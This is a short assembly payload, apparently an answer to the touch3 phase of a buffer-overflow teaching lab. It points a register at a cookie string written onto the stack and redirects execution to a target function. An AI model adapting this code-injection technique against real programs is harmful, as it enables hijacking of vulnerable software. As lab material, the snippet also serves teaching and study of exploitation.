    movq $0x5561dc70,%rdi /* set input argument (address of sval) */
    movq $0x4018fa,(%rsp) /* redirect program to touch 3 */
    
    movl $0x39623935,-0x38(%rsp) /* set cookie to address of sval */
    movl $0x61663739,-0x34(%rsp) /* set cookie to address of sval */ 
    /* will also work if we can move 0x6166373939623935 to -0x38(%rsp) */
    movl $0x0,-0x30(%rsp) /* set cookie to address of sval */  
    retq
